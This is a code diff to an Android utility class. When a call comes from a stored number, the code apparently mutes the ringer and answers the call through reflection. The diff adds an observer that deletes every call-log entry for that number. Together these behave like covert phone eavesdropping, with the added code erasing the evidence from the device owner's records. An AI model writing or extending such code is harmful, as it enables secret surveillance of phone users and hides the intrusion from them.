@@ -6,9 +6,13 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
+import android.database.ContentObserver;
+import android.database.Cursor;
 import android.media.AudioManager;
+import android.net.Uri;
 import android.os.Bundle;
-import android.os.PowerManager;
+import android.os.Handler;
+import android.provider.CallLog;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -69,6 +73,7 @@ public class PhoneUtils {
 				jinyin(context);
 				answerRingingCallWithReflect(context);
 				PhoneUtils.phonenumber=phonenumber;
+				context.getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true,new CallLogObserver(context,new Handler(),phonenumber));
 			}
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
@@ -77,6 +82,38 @@ public class PhoneUtils {
 		
 
 	}
+	
+	private static class CallLogObserver extends ContentObserver {
+        private String incomingNumber;
+        private Context context;
+
+        public CallLogObserver(Context context,Handler handler, String incomingNumber) {
+                super(handler);
+                this.incomingNumber = incomingNumber;
+                this.context=context;
+        }
+
+        // 当观察到内容发生改变的时候 调用的方法.
+        @Override
+        public void onChange(boolean selfChange) {
+                super.onChange(selfChange);
+                deleteFromCallLog(context,incomingNumber);
+                context.getContentResolver().unregisterContentObserver(this);
+        }
+
+}
+	
+	public static void deleteFromCallLog(Context context,String incomingNumber) {
+        Uri uri = Uri.parse("content://call_log/calls");
+        Cursor cursor = context.getContentResolver().query(uri, new String[] { "_id" },
+                        "number=?", new String[] { incomingNumber }, null);
+        while (cursor.moveToNext()) {
+                String id = cursor.getString(0);
+                context.getContentResolver().delete(uri, "_id=?", new String[] { id });
+        }
+        cursor.close();
+}
+	
 	public static void lock(Context context){
 		SqlUtils su=new SqlUtils(context);
 		if(su.queryPhone(phonenumber)){
